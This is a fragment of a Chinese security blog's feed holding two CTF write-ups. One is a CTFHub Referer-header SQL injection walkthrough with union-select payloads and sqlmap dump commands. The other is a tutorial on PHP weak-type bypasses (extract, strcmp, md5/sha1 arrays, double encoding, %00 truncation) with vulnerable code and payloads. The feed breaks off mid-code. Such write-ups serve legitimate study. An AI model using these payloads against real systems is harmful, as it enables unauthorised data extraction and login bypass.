--dump</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127155209659.png" alt="在这里插入图片描述"></p><h2 id="Refer注入"><a href="#Refer注入" class="headerlink" title="Refer注入"></a>Refer注入</h2><p><img src="https://img-blog.csdnimg.cn/20210127161950997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示请在referer输入ID，bp抓包<br><img src="https://img-blog.csdnimg.cn/20210127162149802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>补充Referer头<br><img src="https://img-blog.csdnimg.cn/20210127162227937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.爆数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database()<br></code></pre></td></tr></table></figure><p>当前数据库名为sqli<br><img src="https://img-blog.csdnimg.cn/20210127162404134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span><br></code></pre></td></tr></table></figure><p>有两个表， news,scghlrqxyi<br><img src="https://img-blog.csdnimg.cn/20210127162506792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.爆字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;scghlrqxyi&#x27;</span><br></code></pre></td></tr></table></figure><p>字段名为vzbmlruwwt<br><img src="https://img-blog.csdnimg.cn/20210127162548886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>4.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(vzbmlruwwt) <span class="hljs-keyword">from</span> scghlrqxyi<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127162635557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>sqlmap–Refer注入</strong></p><blockquote><p>伪造http请求中的referer，level&gt;=3时，sqlmap尝试referer注入</p></blockquote><p>首先检测是否有Refer注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="hljs-comment">--referer &quot;id=1&quot; --level 3</span><br></code></pre></td></tr></table></figure><p>Referer头存在注入<br><img src="https://img-blog.csdnimg.cn/20210127164244547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>1.爆数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="hljs-comment">--referer &quot;id=1&quot; --level 3 --dbs</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164340575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2.爆表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="hljs-comment">--referer &quot;id=1&quot; --level 3 -D sqli --tables</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164517402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.爆字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="hljs-comment">--referer &quot;id=1&quot; --level 3 -D sqli -T scghlrqxyi --columns</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164603239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>4.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="hljs-comment">--referer &quot;id=1&quot; --level 3 -D sqli -T scghlrqxyi -C vzbmlruwwt --dump</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164810825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：CTFHub靶场通关（二）&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="WEB" scheme="http://atkx.top/categories/CTF/WEB/"/>
    
    
    <category term="CTFhub" scheme="http://atkx.top/tags/CTFhub/"/>
    
    <category term="SQL注入" scheme="http://atkx.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>代码审计之弱类型绕过</title>
    <link href="http://atkx.top/2020/11/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/"/>
    <id>http://atkx.top/2020/11/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/</id>
    <published>2020-11-04T07:48:04.000Z</published>
    <updated>2021-05-27T12:49:07.256Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：PHP弱类型绕过方法</p> <a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>之前做过没有总结，这几天做题经常遇见弱类型绕过，写篇博客总结一下(水一篇)，嘻嘻。</p></blockquote><p>提到php代码绕过，必然会提起<code>比较操作符</code>,下面来谈一谈比较操作符<code>==</code>与<code>===</code>，这两种都可以比较两个数字的大小，但是有很明显的区别。</p><table><thead><tr><th>操作符</th><th>描述</th></tr></thead><tbody><tr><td>==</td><td>把两端变量类型转换成相同的，再进行比较</td></tr><tr><td>===</td><td>先判断两端变量类型是否相同，再进行比较</td></tr></tbody></table><p><strong>注意</strong>：在两个相等的符号中，一个字符串与一个数字相比较时，字符串会转换成数值。</p><h2 id="1-extract变量覆盖"><a href="#1-extract变量覆盖" class="headerlink" title="1.extract变量覆盖"></a>1.extract变量覆盖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;xxx&#x27;</span>;<br>extract(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$shiyan</span>)) &#123;<br><span class="hljs-variable">$content</span>=trim(file_get_contents(<span class="hljs-variable">$flag</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$shiyan</span>==<span class="hljs-variable">$content</span>) &#123;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;flag&#123;xxx&#125;&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Oh.no&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>extract()</td><td>函数从数组中将变量导入到当前的符号表</td></tr></tbody></table><p>在第三行, 运用了extract()函数, 将GET方式获得的变量导入到当前的符号表中,然后判断$ flag和$ shiyan两个变量的内容是否相等。</p><p>extract()函数导致这段代码存在一个变量覆盖漏洞,构造Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload:?flag=&amp;shiyan=<br></code></pre></td></tr></table></figure><p> $ flag和$ shiyan这两个变量的内容都会被设置成空字符串。这样,就满足$shiyan == $content的条件，输出flag。<br><img src="https://img-blog.csdnimg.cn/20200425110348780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="2-strcmp比较字符串"><a href="#2-strcmp比较字符串" class="headerlink" title="2.strcmp比较字符串"></a>2.strcmp比较字符串</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;xxxxx&#125;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (strcmp(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>], <span class="hljs-variable">$flag</span>) == <span class="hljs-number">0</span>) <span class="hljs-comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="hljs-comment">//比较两个字符串（区分大小写）</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>); <br>    <span class="hljs-keyword">else</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;No&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>用法</th><th>返回值</th></tr></thead><tbody><tr><td>strcmp()</td><td>strcmp(string1,string2)</td><td>若返回0,代表两个字符串相等 ；若返回&lt;0 ,代表string1 小于 string2；若返回&gt;0，代表string1 大于 string2</td></tr></tbody></table><p>对于传入非字符串类型的数据的时候，strcmp函数会报错，将return 0 ，但却判定其相等了。<br> 所以，strcmp()在比较字符串和数组的时候直接返回0，这样通过把目标变量设置成数组就可以绕过该函数的限制。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload:?a[]=<span class="hljs-number">123</span> <br></code></pre></td></tr></table></figure><p> <img src="https://img-blog.csdnimg.cn/20200425113316110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="3-urldecode二次编码绕过"><a href="#3-urldecode二次编码绕过" class="headerlink" title="3.urldecode二次编码绕过"></a>3.urldecode二次编码绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(eregi(<span class="hljs-string">&quot;hackerDJ&quot;</span>,<span class="hljs-variable">$_GET</span>[id])) &#123;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);<br><span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$_GET</span>[id] = urldecode(<span class="hljs-variable">$_GET</span>[id]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[id] == <span class="hljs-string">&quot;hackerDJ&quot;</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Access granted!&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>urldecode()</td><td>解码已编码的 URL 字符串</td></tr></tbody></table><p>使用GET传参时，浏览器就已经把hakerDJ进行了一次解码了，然后又用了urldecode函数又再次进行了一次解码。所以我们要将hakerDJ进行二次编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">42</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">41</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031180041123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="4-md5-函数"><a href="#4-md5-函数" class="headerlink" title="4.md5()函数"></a>4.md5()函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Your password can not be your username.&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) === md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>项</th><th>描述</th></tr></thead><tbody><tr><td>md5()</td><td>函数计算字符串的 MD5 散列</td></tr><tr><td>==</td><td>只需要等号两边的值是否相等。比如‘1’==1就成立，返回true</td></tr><tr><td>===</td><td>需要全等号两边的值和类型全都相等才成立</td></tr></tbody></table><p>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload:?username[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200425115133708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="5-数组返回NULL绕过"><a href="#5-数组返回NULL绕过" class="headerlink" title="5.数组返回NULL绕过"></a>5.数组返回NULL绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You password must be alphanumeric&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;--&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<br>     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>ereg</td><td>函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回true，否则返回false</td></tr><tr><td>strpos</td><td>函数查找字符串在另一字符串中第一次出现的位置。</td></tr></tbody></table><p>第4行代码，ereg函数会对传入的password从<code>a-z,A-Z,0-9</code> 进行匹配，将你的密码限制在这三种字符中。</p><p><strong>方法一</strong>：<br><code>strpos()</code>需要匹配到<code>--</code>才能输出flag，所以我们需要绕过<code>strpos()</code>函数。<code>strpos()</code>如果传入数组，会返回NULL。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?password[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031185451492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>方法二</strong>：</p><p>搜索字母的字符是大小写敏感的, 我们可以用%00来截断，在%00之后的数值函数无法识别</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?password=<span class="hljs-number">1</span>%<span class="hljs-number">00</span>--<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031185650537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="6-弱类型整数大小比较绕过"><a href="#6-弱类型整数大小比较绕过" class="headerlink" title="6. 弱类型整数大小比较绕过"></a>6. 弱类型整数大小比较绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$temp</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>is_numeric(<span class="hljs-variable">$temp</span>)?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no numeric&quot;</span>):<span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$temp</span>&gt;<span class="hljs-number">1336</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br></code></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>is_numeric()</td><td>判断变量是否为数字或数字字符串</td></tr></tbody></table><p>传入的值会被is_numeric函数进行检测，如果为数字就直接输出no numeric，传参<code>password=2000a</code>既不是一个数字又大于1336,返回NULL，可以绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?password=<span class="hljs-number">2000</span>a<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031192339220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="7-sha-函数比较绕过"><a href="#7-sha-函数比较绕过" class="headerlink" title="7. sha()函数比较绕过"></a>7. sha()函数比较绕过</h2><p><a href="http://123.206.87.240:9009/7.php">http://123.206.87.240:9009/7.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>var_dump(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;  &quot;</span>;<br>var_dump(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>var_dump(sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br>var_dump(sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]));<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your password can not be your name!&#x27;</span>; <br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>); <span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password.&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Login first!&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>sha1()函数无法处理数组类型，通过构造数组，将报错并返回false，使条件成立，这样就绕过了sha1()函数，获得flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?name[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031215444337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="8-md5加密相等绕过"><a href="#8-md5加密相等绕过" class="headerlink" title="8. md5加密相等绕过"></a>8. md5加密相等绕过</h2><p><a href="http://123.206.87.240:9009/13.php">http://123.206.87.240:9009/13.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 